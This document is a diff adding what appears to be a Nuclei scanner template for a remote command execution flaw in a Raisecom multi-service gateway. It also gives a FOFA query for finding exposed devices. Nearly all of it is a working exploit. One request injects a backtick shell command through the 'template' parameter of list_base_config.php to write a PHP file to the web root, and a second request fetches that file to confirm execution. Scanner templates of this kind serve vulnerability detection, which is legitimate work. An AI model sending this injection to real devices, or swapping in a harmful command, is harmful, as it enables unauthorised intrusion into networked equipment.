@@ -1,0 +1,34 @@
+id: RAISECOM-list_base_config-rce
+
+info:
+  name: 瑞斯康达-多业务智能网关 list_base_config.php 远程命令执行
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/images/raisecom/back.gif" && title=="Web user login"
+
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{username}}.php%60 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /tmp/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PHP Version'
+          - 'phpinfo()'
+      - type: status
+        status: 
+          - 200
